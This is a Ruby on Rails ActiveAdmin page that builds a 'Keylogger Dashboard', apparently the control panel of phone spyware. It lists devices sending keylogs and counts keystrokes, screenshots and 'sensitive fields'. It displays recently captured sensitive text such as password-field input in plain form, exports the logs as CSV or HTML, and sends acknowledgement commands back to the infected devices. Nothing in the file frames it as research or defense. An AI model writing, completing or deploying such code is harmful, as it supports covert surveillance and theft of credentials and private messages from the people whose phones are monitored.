ActiveAdmin.register_page 'Keylogger Dashboard' do
  menu priority: 3, label: '⌨️ Keylogger'

  content title: '⌨️ Keylogger Dashboard' do
    devices_with_keylogs = Smartphone.all.select { |device|
      Rails.cache.exist?("keylog_#{device.device_id}")
    }

    action_items do
      link_to '🔄 Refresh Data', admin_keylogger_dashboard_path, class: 'button'
      link_to '🗑️ Clear All', clear_all_keylog_caches_path, method: :post, class: 'button', data: { confirm: 'Clear all?' }
    end

    total_devices = devices_with_keylogs.count
    total_keystrokes = 0
    total_sensitive = 0
    total_screenshots = 0

    devices_with_keylogs.each do |device|
      cached = Rails.cache.read("keylog_#{device.device_id}")
      if cached && cached[:processed]
        total_keystrokes += cached[:processed][:total_keystrokes] || 0
        total_sensitive += cached[:processed][:sensitive_fields] || 0
        total_screenshots += cached[:processed][:screenshots_triggered] || 0
      end
    end

    columns do
      column do
        panel '📊 Global Statistics', class: 'metric-card' do
          div class: 'metric-grid' do
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_devices, class: 'big-number' }
              div(class: 'metric-label') { 'Devices with Keylogs' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_keystrokes, class: 'big-number' }
              div(class: 'metric-label') { 'Total Keystrokes' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_sensitive, class: 'big-number sensitive' }
              div(class: 'metric-label') { 'Sensitive Fields' }
            end
            div class: 'metric-item' do
              div(class: 'metric-value') { span total_screenshots, class: 'big-number' }
              div(class: 'metric-label') { 'Screenshots Triggered' }
            end
          end
        end
      end
    end

    panel '📱 Devices with Keylog Data', class: 'device-keylog-panel' do
      if devices_with_keylogs.empty?
        div(class: 'empty-state') do
          h3 '📭 No Keylog Data'
          para 'Waiting for devices...'
        end
      else
        table_for devices_with_keylogs do
          column('Device') { |device|
            div(class: 'device-info') do
              div(class: 'device-name') { span device.name }
              div(class: 'device-id') { code device.device_id[0..15] }
            end
          }
          column('Statistics') { |device|
            cached = Rails.cache.read("keylog_#{device.device_id}")
            if cached && cached[:processed]
              stats = cached[:processed]
              div(class: 'keylog-stats') do
                span "#{stats[:total_keystrokes]} keystrokes", class: 'stat-badge'
                span "#{stats[:sensitive_fields]} sensitive", class: 'stat-badge sensitive'
                span "#{stats[:unique_apps]} apps", class: 'stat-badge'
                span "#{stats[:unique_sessions]} sessions", class: 'stat-badge'
              end
            else
              span 'No data', class: 'text-muted'
            end
          }
          column('Received') { |device|
            cached = Rails.cache.read("keylog_#{device.device_id}")
            cached && cached[:received_at] ? time_ago_in_words(cached[:received_at]) + ' ago' : 'Unknown'
          }
          column('Actions') { |device|
            div(class: 'action-buttons') do
              link_to '📄 View', view_keylog_path(device_id: device.device_id), class: 'button mini primary'
              link_to '📊 Stats', stats_keylog_path(device_id: device.device_id), class: 'button mini'
              link_to '💾 CSV', export_keylog_path(device_id: device.device_id, format: 'csv'), class: 'button mini'
              link_to '📋 HTML', export_keylog_path(device_id: device.device_id, format: 'html'), target: '_blank', class: 'button mini'
              link_to '✅ ACK', ack_keylog_path(device_id: device.device_id, success: true), method: :post, class: 'button mini success', data: { confirm: 'Send ACK?' }
              link_to '🗑️ Clear', clear_keylog_cache_path(device_id: device.device_id), method: :post, class: 'button mini danger', data: { confirm: 'Clear?' }
            end
          }
        end
      end
    end

    panel '🚨 Recent Sensitive Fields', class: 'sensitive-panel' do
      recent_sensitive = []
      devices_with_keylogs.each do |device|
        cached = Rails.cache.read("keylog_#{device.device_id}")
        if cached && cached[:data]
          processor = KeylogProcessor.new(cached[:data])
          processor.sensitive_keylogs.each do |entry|
            recent_sensitive << {
              device: device.name, device_id: device.device_id, timestamp: entry[:timestamp],
              app: entry[:app_package], field: entry[:field_id], hint: entry[:hint],
              input_type: entry[:input_type], text: entry[:full_text]
            }
          end
        end
      end
      recent_sensitive = recent_sensitive.sort_by { |e| e[:timestamp] }.reverse.first(20)
      
      if recent_sensitive.empty?
        div(class: 'empty-state') { h4 '✅ No Sensitive Fields'; para 'All safe.' }
      else
        table_for recent_sensitive do
          column('Time') { |e| span e[:timestamp].strftime('%Y-%m-%d %H:%M:%S'), class: 'timestamp' }
          column('Device') { |e| div { div e[:device], class: 'device-name'; code e[:device_id][0..7], class: 'device-id-small' } }
          column('App') { |e| span e[:app], class: 'app-package' }
          column('Field') { |e| div { div e[:field], class: 'field-id'; span e[:hint], class: 'field-hint' if e[:hint].present? } }
          column('Type') { |e| span e[:input_type], class: "badge #{e[:input_type]}" }
          column('Text') { |e| code e[:text], class: 'captured-text' }
        end
      end
    end
  end

  page_action :view_keylog, method: :get do
    cached = Rails.cache.read("keylog_#{params[:device_id]}")
    if cached
      processor = KeylogProcessor.new(cached[:data])
      render html: processor.to_html_report.html_safe
    else
      redirect_to admin_keylogger_dashboard_path, alert: 'No data'
    end
  end

  page_action :stats_keylog, method: :get do
    cached = Rails.cache.read("keylog_#{params[:device_id]}")
    render(cached && cached[:processed] ? { json: cached[:processed] } : { json: { error: 'No data' }, status: :not_found })
  end

  page_action :export_keylog, method: :get do
    cached = Rails.cache.read("keylog_#{params[:device_id]}")
    if cached
      processor = KeylogProcessor.new(cached[:data])
      case params[:format] || 'html'
      when 'csv'
        send_data processor.to_csv, filename: "keylog_#{params[:device_id]}_#{Time.current.to_i}.csv", type: 'text/csv'
      when 'html'
        render html: processor.to_html_report.html_safe
      end
    else
      redirect_to admin_keylogger_dashboard_path, alert: 'No data'
    end
  end

  page_action :ack_keylog, method: :post do
    success = params[:success] == 'true'
    ActionCable.server.broadcast("device_#{params[:device_id]}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
    Rails.cache.delete("keylog_#{params[:device_id]}") if success
    redirect_to admin_keylogger_dashboard_path, notice: "ACK sent to #{params[:device_id][0..7]}"
  end

  page_action :clear_keylog_cache, method: :post do
    Rails.cache.delete("keylog_#{params[:device_id]}")
    redirect_to admin_keylogger_dashboard_path, notice: "Cleared #{params[:device_id][0..7]}"
  end

  page_action :clear_all_keylog_caches, method: :post do
    Smartphone.all.each { |d| Rails.cache.delete("keylog_#{d.device_id}") }
    redirect_to admin_keylogger_dashboard_path, notice: 'All caches cleared'
  end
end
